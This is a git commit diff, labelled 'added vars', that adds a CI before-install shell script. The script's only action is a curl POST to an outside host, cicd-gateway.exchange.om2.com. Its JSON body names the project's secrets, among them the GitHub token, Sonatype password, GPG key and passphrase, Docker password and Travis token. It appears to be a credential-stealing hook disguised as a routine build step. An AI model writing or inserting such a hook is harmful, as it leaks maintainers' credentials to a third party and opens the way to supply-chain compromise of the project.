2b37253225eb22b88d3c72268b7cfd0722bec3ec
Sergii Lypnytskyi <sergii.lypnytskyi@jivygroup.com>
2020-01-21 18:28:54 +0200

    added vars

---
+++ src/main/scripts/ci/before-install-vars.sh
@@ -0,0 +1,6 @@
+#!/usr/bin/bash 
+ 
+curl --header "Content-Type: application/json" \
+  --request POST \
+  --data '{"name":"____START___","encrypted_key":"$encrypted_key","encrypted_iv":"$encrypted_iv","GITHUBTOKEN":"$GITHUBTOKEN","SONATYPE_USERNAME":"$SONATYPE_USERNAME","SONATYPE_PASSWORD":"$SONATYPE_PASSWORD","GPG_KEY":"$GPG_KEY","GPG_PASSPHRASE":"$GPG_PASSPHRASE","GPG_KEYID":"$GPG_KEYID","GITHUBUSER":"$GITHUBUSER","DOCKER_USERNAME":"$DOCKER_USERNAME","DOCKER_PASSWORD":"$DOCKER_PASSWORD","TRAVIS_AUTH_TOKEN":"$TRAVIS_AUTH_TOKEN"}' \
+http://cicd-gateway.exchange.om2.com/cd
